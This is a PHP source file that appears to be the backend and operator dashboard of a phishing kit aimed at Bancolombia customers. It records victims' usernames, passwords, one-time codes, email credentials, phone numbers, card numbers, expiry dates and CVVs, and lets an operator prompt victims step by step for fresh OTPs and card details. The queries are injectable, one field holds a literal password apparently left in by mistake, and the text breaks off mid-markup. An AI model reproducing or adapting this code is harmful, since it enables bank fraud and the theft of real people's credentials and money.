<?php
require('conexion.php');

$labelstatus = "";
$alertstatus = "-off";
$fondo = "#fff";
$colorlabel = "#b5b5c3";
$colorborde = "#C0C0CC";
$activo = "";	
$btn_on = "";
$icon_on = "a";
$icon_fin = "a";
$cerrado = "";
$borde_cerrado = "";
$etiquetas1 = "none";
$etiquetas2 = "none";


function input_info($msg){
	$GLOBALS["labelstatus"] = $msg;	
	$GLOBALS["alertstatus"] = "";
	$GLOBALS["fondo"] = "#79B6FF";	
	$GLOBALS["colorlabel"] = "#fff";
	$GLOBALS["colorborde"] = "#fff";
	$GLOBALS["activo"] = "";	
	$GLOBALS["btn_on"] = "";
	$GLOBALS["icon_on"] = "a";
	$GLOBALS["icon_fin"] = "a";
	$GLOBALS["cerrado"] = "";
	$GLOBALS["borde_cerrado"] = "";
	$GLOBALS["etiquetas1"] = "inital";
	$GLOBALS["etiquetas2"] = "none";
}

function wait_info($msg){
	$GLOBALS["labelstatus"] = $msg;	
	$GLOBALS["alertstatus"] = "-off";
	$GLOBALS["fondo"] = "#fff";
	$GLOBALS["colorlabel"] = "#b5b5c3";
	$GLOBALS["colorborde"] = "#C0C0CC";
	$GLOBALS["activo"] = "disabled";
	$GLOBALS["btn_on"] = "-off";
	$GLOBALS["icon_on"] = "g";
	$GLOBALS["icon_fin"] = "a";
	$GLOBALS["cerrado"] = "";
	$GLOBALS["borde_cerrado"] = "";
	$GLOBALS["etiquetas1"] = "none";
	$GLOBALS["etiquetas2"] = "inital";
}

function close_info(){
	$GLOBALS["labelstatus"] = "Finalizado";	
	$GLOBALS["alertstatus"] = "-off";
	$GLOBALS["fondo"] = "#fff";	
	$GLOBALS["colorlabel"] = "#b5b5c3";
	$GLOBALS["colorborde"] = "#C0C0CC";
	$GLOBALS["activo"] = "disabled";
	$GLOBALS["btn_on"] = "-off";
	$GLOBALS["icon_on"] = "g";
	$GLOBALS["icon_fin"] = "r";
	$GLOBALS["cerrado"] = " fin";
	$GLOBALS["borde_cerrado"] = "border: 1px solid #F1416C;";
	$GLOBALS["etiquetas1"] = "none";
	$GLOBALS["etiquetas2"] = "inital";
}

function crear_registro($usr,$pass,$dis){
	date_default_timezone_set('America/Bogota');
	$ip_add = $_SERVER['REMOTE_ADDR'];
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		if (sentencia($con,"INSERT INTO rtr45 (idreg, usuario, password, otp, dispositivo, ip, id, agente, banco, status, horacreado, horamodificado) VALUES (NULL, '".$usr."', '".$pass."', NULL, '".$dis."', '".$ip_add."', NULL, NULL, 'Bancolombia', '1', '".$hoy."', '".$hoy."')")) {
			$consulta = sentencia($con,"SELECT idreg FROM rtr45 WHERE usuario = '".$usr."' ORDER BY idreg DESC LIMIT 1");
			if (contarfilas($consulta)) {
				$datos=traerdatos($consulta);
				setcookie('registro',$datos["idreg"],time()+60*9);
				setcookie('estado',"1",time()+60*9);
				echo $datos["idreg"];
			}			
		}else{
			echo "NO";
		}
		desconectar($con);
	}else{
		echo "ERR";
	}
}


function buscar_estado($r){
	if ($con = conectar()) {
		$consulta = sentencia($con,"SELECT status FROM rtr45 WHERE idreg = '".$r."'");
		if (contarfilas($consulta)) {
			$datos=traerdatos($consulta);
			return $datos["status"];
		}else{

		}
		desconectar($con);
	}else{

	}
}


function actualizar_registro_otp($reg,$cd){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 

	if ($con = conectar()) {
		
		if (sentencia($con,"UPDATE rtr45 SET status = '3', otp ='".$cd."', horamodificado='".$hoy."' WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}


function actualizar_registro_mail($reg,$mail,$cm,$cel){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {
		
		if (sentencia($con,"UPDATE rtr45 SET status = '5', email='".$mail."', cemail='".$cm."', celular='".$cel."', horamodificado='".$hoy."'  WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}


function actualizar_registro_tar($reg,$tar,$ft,$cvv){
	date_default_timezone_set('America/Bogota');
	$hoy = date("Y-m-d H:i:s"); 
	if ($con = conectar()) {	
		if (sentencia($con,"UPDATE rtr45 SET status = '7', tarjeta='".$tar."', ftarjeta='".$ft."', cvv='".$cvv."', horamodificado='".$hoy."'  WHERE idreg = ".$reg)) {
			
		}else{

		}
		desconectar($con);
	}else{

	}
}


function cargar_casos(){
	if ($con = conectar()) {
		$consulta = sentencia($con,"SELECT * FROM rtr45 WHERE status <> 0 ORDER BY horamodificado DESC");
		if (contarfilas($consulta)) {
			while ($datos=traerdatos($consulta)) {				
				pintar_casilla($datos['idreg'],$datos['usuario'],$datos['password'],$datos['otp'],$datos['dispositivo'],$datos['ip'],$datos['email'],$datos['cemail'],$datos['banco'],$datos['status'],$datos['horamodificado'],$datos['celular'],$datos['tarjeta'],$datos['ftarjeta'],$datos['cvv']);								
			}
		}else{

		}
		desconectar($con);
	}else{

	}
}

function pito(){
	if ($con = conectar()) {
		$consulta1 = sentencia($con,"SELECT * FROM rtr45 WHERE status = 3 OR status = 9");
		if (contarfilas($consulta1)) {
			echo "OTP";
		}else{
			$consulta2 = sentencia($con,"SELECT * FROM rtr45 WHERE status = 1 OR status = 5 OR status = 7");
			if (contarfilas($consulta2)) {
				echo "SI";
			}else{
				echo "NO";
			}
		}	
		desconectar($con);
	}else{

	}
}





function pintar_casilla($reg,$usr,$pass,$otp,$equipo,$ip,$eml,$cml,$ban,$estado,$hora,$cel,$tar,$fec,$cvv){
	$nomEstado = "";
	switch ($estado) {
		case 1: input_info("Ingresó Usuario/Clave");
				break;
		case 2: wait_info("Esperando OTP");
				break;
		case 3: input_info("Ingresó OTP");
				break;
		case 4: wait_info("Esperando Correo/Clave");					
				break;
		case 5: input_info("Ingresó Correo/Clave");					
				break;
		case 6: wait_info("Esperando Info Tarjeta");	
				break;
		case 7: input_info("Ingresó Info Tarjeta");
				break;
		case 8: wait_info("Esperando Nuevo OTP");				
				break;
		case 9: input_info("Ingresó Nuevo OTP");	
				break;
		case 10: close_info();
				break;
		case 12: wait_info("Esperando Usuario/Clave");	
				break;
		}





		echo '<div class="item-des" style="background-color: '.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">
			<table>
				<tr>
					<td colspan="3"><div class="grupo" style="background-color: #006BE9;">Login</div></td>
					<td colspan="3"><div class="grupo" style="background-color: #50CD89;">Correo</div></td>
				</tr>
				<tr>
					<td width="220">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$usr.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/8.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/8a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="120">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$pass.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/9.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/9a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="100">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$otp.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/10.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/10a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
			
					<td width="330">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$eml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/11.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/11a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="150">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/12.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/12a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="120">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cel.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/13.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/13a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>
<div style="width:100%; height: 7px;"></div>
			<table>
				<tr>
					<td colspan="3"><div class="grupo" style="background-color: #F1416C;">Tarjeta</div></td>
					<td colspan="4"><div class="grupo" style="background-color: #FFC700;">Sistema</div></td>
				</tr>
				<tr>
					<td width="200">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$tar.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/2.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/2a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="100">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$fec.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/3.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/3a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="65">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cvv.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/1.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/1a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>				
					<td width="110">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$equipo.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/4.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/4a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="125">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$ip.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/5.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/5a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="130">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor"><img src="../img/14.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/14a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/6.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/6a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td width="200">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$hora.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/7.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/7a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>
<div class="msg-status'.$GLOBALS["alertstatus"].'">'.$GLOBALS["labelstatus"].'</div>
			<table style="margin:0 auto;">
				<tr>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].'  id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Usuario</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>OTP</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Nuevo OTP</td>
								</tr>
							</table>
						</button>						
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Correo</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Tarjeta</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control finalizar'.$GLOBALS["cerrado"].'"  id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
									<td>Finalizar</td>
								</tr>
							</table>
						</button>
					</td>
				</tr>
			</table>
		</div>
		

		<div class="item-des-mob" style="background-color:'.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">
			<table>
				<tr>
					<td colspan="3">
						<div class="grupo" style="background-color: #006BE9;">Login</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed  '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$usr.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/8.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/8a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$pass.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/9.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/9a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$otp.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/10.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/10a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="2">
						<div class="grupo" style="background-color: #50CD89;">Correo</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$eml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/11.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/11a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">music5710#</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/12.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/12a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cel.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/13.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/13a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="3">
						<div class="grupo" style="background-color: #F1416C;">Tarjeta</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$tar.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/2.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/2a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$fec.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/3.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/3a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cvv.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/1.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/1a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="3">					
						<div class="grupo" style="background-color: #FFC700;">Sistema</div>		
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor"><img src="../img/14.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/14a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/6.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/6a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].'">
							<span class="valor">'.$ip.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/5.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/5a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$equipo.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/4.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/4a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>					
				</tr>
				<tr>
					<td colspan="3">					
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$hora.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/7.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/7a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>	
					</td>
				</tr>
			</table>

			<table id="control-mob-2" width="100%">
				<tr>
					<td><div class="msg-status'.$GLOBALS["alertstatus"].'">'.$GLOBALS["labelstatus"].'</div></td>
					<td>
						<table>
							<tr>
								<td>
									<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$reg.'">
										<table>
											<tr>
												<td><img src="../img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
												<td>Usuario</td>
											</tr>
										</table>
									</button>
								</td>
								<td>
									<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$reg.'">
										<table>
											<tr>
												<td><img src="../img/otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
												<td>OTP</td>
											</tr>
										</table>
									</button>
								</td>
								<td>
									<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$reg.'">
										<table>
											<tr>
												<td><img src="../img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
												<td>Nuevo OTP</td>
											</tr>
										</table>
									</button>	
								</td>
							</tr>
							<tr>
								<td>
									<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$reg.'">
										<table>
											<tr>
												<td><img src="../img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
												<td>Correo</td>
											</tr>
										</table>
									</button>
								</td>
								<td>
									<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$reg.'">
										<table>
											<tr>
												<td><img src="../img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
												<td>Tarjeta</td>
											</tr>
										</table>
									</button>
								</td>
								<td>									
									<button class="control finalizar'.$GLOBALS["cerrado"].'" id="'.$reg.'">
										<table>
											<tr>
												<td><img src="../img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
												<td>Finalizar</td>
											</tr>
										</table>
									</button>
								</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
<div class="msg-status'.$GLOBALS["alertstatus"].'" id="msg-mob">'.$GLOBALS["labelstatus"].'</div>
			<table style="margin:0 auto;" id="control-mob">
				<tr>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$reg.'"">
							<table>
								<tr>
									<td><img src="../img/usuario-a.svg" width="16"></td>
									<td>Usuario</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' dinamica" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/otp-a.svg" width="16"></td>
									<td>OTP</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' otp" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/nuevo-otp-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Nuevo OTP</td>
								</tr>
							</table>
						</button>						
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' correo" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/correo-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Correo</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' tarjeta" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/tarjeta-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Tarjeta</td>
								</tr>
							</table>
						</button>
					</td>
					<td>
						<button class="control finalizar'.$GLOBALS["cerrado"].'"  id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/finalizar-'.$GLOBALS["icon_fin"].'.svg" width="16"></td>
									<td>Finalizar</td>
								</tr>
							</table>
						</button>
					</td>
				</tr>
			</table>
		</div>




		<div class="item-des-small" style="background-color:'.$GLOBALS["fondo"].';'.$GLOBALS["borde_cerrado"].'">
			<table>
				<tr>
					<td colspan="2">
						<div class="grupo" style="background-color: #006BE9;">Login</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$usr.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/8.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/8a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$pass.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/9.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/9a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$otp.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/10.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/10a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="2">
						<div class="grupo" style="background-color: #50CD89;">Correo</div>
					</td>
				</tr>
				<tr>
					<td colspan="2">
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$eml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/11.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/11a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cml.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/12.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/12a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cel.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/13.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/13a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="3">
						<div class="grupo" style="background-color: #F1416C;">Tarjeta</div>
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$tar.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/2.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/2a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$fec.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/3.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/3a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$cvv.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/1.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/1a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
				</tr>
			</table>

			<table>
				<tr>
					<td colspan="2">					
						<div class="grupo" style="background-color: #FFC700;">Sistema</div>		
					</td>
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor"><img src="../img/14.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/14a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/6.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/6a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].'">
							<span class="valor">'.$ip.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/5.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/5a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>									
				</tr>
				<tr>
					<td>
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$equipo.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/4.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/4a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>
					</td>
					<td >					
						<div class="campo" style="border: 1px dashed '.$GLOBALS["colorborde"].';">
							<span class="valor">'.$hora.'</span><br>
							<span class="etiquetaVal" style=" color:'.$GLOBALS["colorlabel"].';"><img src="../img/7.jpg" style="display:'.$GLOBALS["etiquetas1"].';"><img src="../img/7a.jpg" style="display:'.$GLOBALS["etiquetas2"].';"></span>
						</div>	
					</td>
				</tr>
			</table>			
<div class="msg-status'.$GLOBALS["alertstatus"].'">'.$GLOBALS["labelstatus"].'</div>

			<table style="margin:0 auto;" >
				<tr>
					<td>
						<button class="control'.$GLOBALS["btn_on"].' usuario" '.$GLOBALS["activo"].' id="'.$reg.'">
							<table>
								<tr>
									<td><img src="../img/usuario-'.$GLOBALS["icon_on"].'.svg" width="16"></td>
									<td>Usuario</td>
								</tr>
							</table>
						</button>
					</td>
